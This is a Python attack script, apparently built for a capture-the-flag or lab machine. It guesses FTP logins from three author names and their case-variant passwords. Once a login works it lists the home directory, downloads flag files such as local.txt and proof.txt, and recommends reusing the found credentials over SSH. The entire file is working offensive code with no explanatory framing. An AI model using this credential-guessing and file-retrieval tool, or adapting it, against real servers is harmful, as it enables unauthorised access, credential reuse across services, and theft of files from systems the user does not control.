#!/usr/bin/env python3
"""charlie_ftp_credtest_7f3a.py

Try FTP logins derived from the three PDF author names (cassie, mark, robert)
using the case-variant passwords, then pull local.txt / proof.txt from the
home directory of whichever account works.

Usage:
    python3 charlie_ftp_credtest_7f3a.py -H 192.168.161.157
    python3 charlie_ftp_credtest_7f3a.py -H 192.168.161.157 -p 21 --list-only

Nothing is brute-forced: 3 users x 3 passwords = 9 attempts, by design.
"""

import argparse
import ftplib
import io
import socket
import sys

NAMES = ["cassie", "mark", "robert"]
INTERESTING = ("local.txt", "proof.txt", "flag.txt", "flag")


def case_variants(name):
    """lowercase, Capitalized, UPPERCASE -- the documented derivation."""
    return [name, name[:1].upper() + name[1:], name.upper()]


def candidates(names):
    for u in names:
        for p in case_variants(u):
            yield u, p


def login(host, port, user, pw, timeout):
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=timeout)
    ftp.login(user, pw)
    return ftp


def list_dir(ftp, path):
    try:
        entries = ftp.nlst(path)
    except ftplib.error_perm:
        return [], []
    files, dirs = [], []
    for e in entries:
        base = e.rsplit("/", 1)[-1]
        if base in (".", ".."):
            continue
        # distinguish dirs by trying to change into them
        try:
            ftp.cwd(e)
            ftp.cwd(path if path else "/")
            dirs.append(e)
        except ftplib.error_perm:
            files.append(e)
    return files, dirs


def try_download(ftp, path):
    buf = io.BytesIO()
    try:
        ftp.retrbinary("RETR " + path, buf.write)
        return buf.getvalue().decode("utf-8", "replace")
    except ftplib.error_perm:
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--host", required=True)
    ap.add_argument("-p", "--port", type=int, default=21)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--list-only", action="store_true",
                    help="stop after finding working credentials")
    args = ap.parse_args()

    hit = None
    for user, pw in candidates(NAMES):
        try:
            ftp = login(args.host, args.port, user, pw, args.timeout)
        except ftplib.error_perm as exc:
            code = str(exc)[:3]
            print("[ ] {:8s} {:8s} -> {}".format(user, pw, code))
            continue
        except (socket.timeout, OSError) as exc:
            print("[!] {}:{} unreachable: {}".format(args.host, args.port, exc))
            return 2
        print("[+] VALID  {}:{}".format(user, pw))
        hit = (user, pw, ftp)
        break

    if not hit:
        print("\n[-] None of the 9 combinations worked.")
        return 1

    user, pw, ftp = hit
    print("[*] pwd = {}".format(ftp.pwd()))
    files, dirs = list_dir(ftp, ftp.pwd())
    print("[*] files: {}".format(files or "-"))
    print("[*] dirs : {}".format(dirs or "-"))

    if args.list_only:
        ftp.quit()
        return 0

    found = False
    for name in files:
        if name.rsplit("/", 1)[-1].lower() in INTERESTING:
            body = try_download(ftp, name)
            if body is not None:
                found = True
                print("\n===== {} =====".format(name))
                print(body.strip()[:2000])

    if not found:
        print("\n[-] No flag file in the FTP home dir; try: ssh {}@{}".format(user, args.host))
    else:
        print("\n[*] Reuse the same pair on SSH: ssh {}@{}".format(user, args.host))

    ftp.quit()
    return 0


if __name__ == "__main__":
    sys.exit(main())
